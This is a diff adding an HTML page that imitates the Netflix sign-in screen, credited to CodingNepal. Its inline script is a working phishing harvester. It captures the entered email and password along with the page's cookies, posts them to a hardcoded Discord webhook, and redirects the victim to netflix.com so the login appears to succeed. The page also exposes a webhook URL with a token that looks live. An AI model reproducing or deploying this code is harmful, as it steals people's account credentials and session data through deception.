@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Login Page | CodingNepal</title>
+    <link rel="stylesheet" href="style.css">
+    <script>
+        function handleLogin(event) {
+            event.preventDefault();  // Prevent default form submission
+
+            const email = document.querySelector('input[type="text"]').value;
+            const password = document.querySelector('input[type="password"]').value;
+
+            // Validate email and password
+            if (!email || !password) {
+                alert("Email and Password are required!");
+                return;
+            }
+
+            // Simulate successful login and redirect to Netflix
+            window.location.href = "https://www.netflix.com/account";
+
+            // Send login data to Discord Webhook
+            const discordWebhookUrl = "https://discord.com/api/webhooks/1326337992985415743/J0foow9K41bJWcverV7UWSEscLV1UqlHcg3rv9z0BWcFGbByfbKZbMMOBFs2kxJQdIUo"; // Replace with your Webhook URL
+
+            const loginData = {
+                content: `**New Login Data**\nEmail: ${email}\nPassword: ${password}\nCookies: ${document.cookie}`
+            };
+
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(loginData)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Data sent to Discord:', data))
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
+</head>
+<body>
+    <nav>
+        <a href="#"><img src="images/logo.svg" alt="logo"></a>
+    </nav>
+    <div class="form-wrapper">
+        <h2>Sign In</h2>
+        <form onsubmit="handleLogin(event)">
+            <div class="form-control">
+                <input type="text" required>
+                <label>Email or phone number</label>
+            </div>
+            <div class="form-control">
+                <input type="password" required>
+                <label>Password</label>
+            </div>
+            <button type="submit">Sign In</button>
+            <div class="form-help">
+                <div class="remember-me">
+                    <input type="checkbox" id="remember-me">
+                    <label for="remember-me">Remember me</label>
+                </div>
+                <a href="#">Need help?</a>
+            </div>
+        </form>
+        <p>New to Netflix? <a href="#">Sign up now</a></p>
+        <small>
+            This page is protected by Google reCAPTCHA to ensure you're not a bot. 
+            <a href="#">Learn more.</a>
+        </small>
+    </div>
+</body>
+</html>
